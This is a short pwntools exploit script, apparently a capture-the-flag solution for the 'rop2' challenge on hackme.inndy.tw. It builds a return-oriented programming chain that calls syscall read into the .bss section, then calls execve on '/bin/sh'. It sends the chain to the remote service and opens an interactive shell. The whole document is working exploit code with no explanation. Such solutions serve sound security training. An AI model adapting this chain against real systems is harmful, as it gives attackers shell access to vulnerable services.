from pwn import * 
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])

elf = ELF("./rop2")
syscall_addr = elf.symbols["syscall"]
bss_addr = elf.bss()
ppppr_addr = 0x08048578

payload = fit({0x10: [p32(syscall_addr), p32(ppppr_addr), p32(3), p32(0), p32(bss_addr), p32(8)]})
payload += fit({0x0: [p32(syscall_addr), p32(0x08048578), p32(11), p32(bss_addr), p32(0), p32(0)]})


#io = process("./rop2")
io = remote('hackme.inndy.tw', 7703) 
io.sendlineafter("your ropchain:", payload)
io.send("/bin/sh\0")
io.interactive()
io.close()
